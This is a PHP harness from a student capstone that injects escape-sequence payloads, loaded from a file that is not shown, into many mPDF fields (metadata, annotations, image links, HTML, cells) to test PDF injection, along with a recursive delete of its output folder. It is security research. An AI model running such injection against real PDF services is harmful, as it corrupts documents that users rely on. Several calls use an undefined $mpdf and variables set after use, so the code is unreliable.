<!-- File: injection.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (PDF injection & Image Escape) for mPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*.pdf");

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
	$pdf = new \Mpdf\Mpdf(['tempDir' => __DIR__ . '/temp']);
	$pdf->SetCompression(false);
	$pdf->AddPage();
	return $pdf;
  }

// Creator
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetCreator($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/creator'.$i.'.pdf');
    $i++;
}

// Title
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetTitle($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/title'.$i.'.pdf');
    $i++;
}

// Author
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetAuthor($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/author'.$i.'.pdf');
    $i++;
}

// Subject
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetSubject($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/subject'.$i.'.pdf');
    $i++;
}

// Keywords
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetKeywords($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/keywords'.$i.'.pdf');
    $i++;
}

// Annotation
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetKeywords($seq.$xref);
	$pdf->Annotation(
		$seq.$xref,
		145, 24, $seq.$xref, $seq.$xref, $seq.$xref,
		0.7, array(127, 127, 255)
	);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/annotation'.$i.'.pdf');
    $i++;
}

// Image Links
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
	$pdf->Image("/var/www/myapp/images/xref.jpg", 0, 0, 210, 297, 'jpg', $seq.$xref, true, false);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/linkimage'.$i.'.pdf');
    $i++;
}

// Image Streams
$i = 0;
$path = "/var/www/myapp/images";
if ($handle = opendir($path)) {
    while (false !== ($file = readdir($handle))) {
        if ('.' === $file) continue;
        if ('..' === $file) continue;
        $pdf = createPDF();

        // Get Extension of Image
        $ext_option = "";
        $ext = explode(".", $file);
        $ext = strtolower($ext[count($ext) - 1]);
        if ($ext == "jpeg" || $ext == "jpg") {
            $ext_option = "jpg";
        }
        elseif ($ext == "png") {
            $ext_option = "png";
        }
        else {
            $ext_option = "jpg";
        }

		$pdf->Image("/var/www/myapp/images/".$file, 0, 0, 210, 297, $ext_option, '', true, false);
		$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
		$pdf->OutputFile('/var/www/myapp/pdfs/image'.$i.'.pdf');
        $i++;
    }
    closedir($handle);
}

// AutosizeText
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->AutosizeText($seq.$xref, 20.0, 'times', '', 72);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/autosize'.$i.'.pdf');
    $i++;
}

// MultiCell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->MultiCell( 20.0, 20.0, $seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/multicell'.$i.'.pdf');
    $i++;
}

// writeHTML
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->WriteHTML($seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/writehtml'.$i.'.pdf');
    $i++;
}

// writeCell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $mpdf->WriteCell(120, 120, $seq.$xref);
	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $pdf->OutputFile('/var/www/myapp/pdfs/writecell'.$i.'.pdf');
    $i++;
}

// Overwrite
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    // All the text to replace
    $pdf->AutosizeText('Replacethistext', 15.0, 'times', '', 72);
    $mpdf->WriteCell(120, 120, 'Replacethistext');
    $pdf->WriteHTML('Replacethistext');
    $pdf->WriteHTML('Replacethistext');
    $pdf->OutputFile('/var/www/myapp/pdfs/overwritef'.$i.'.pdf');

	$pdf->AutosizeText('DOGTEST', 15.0, 'times', '', 72);
    $mpdf->OverWrite('/var/www/myapp/pdfs/overwritef'.$i.'.pdf', $search, $replacement, 'F', '/var/www/myapp/pdfs/overwritef'.$i.'.pdf');
    $i++;
}

$search = array(
	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXZZZZZZZZ'
);

$replacement = array(
	"personalised for Jos\xc3\xa9 Bloggs",
	"COPYRIGHT: Licensed to Jos\xc3\xa9 Bloggs"
);

?>
<h1 style="text-align:center;">PDF Injection Complete!</h1>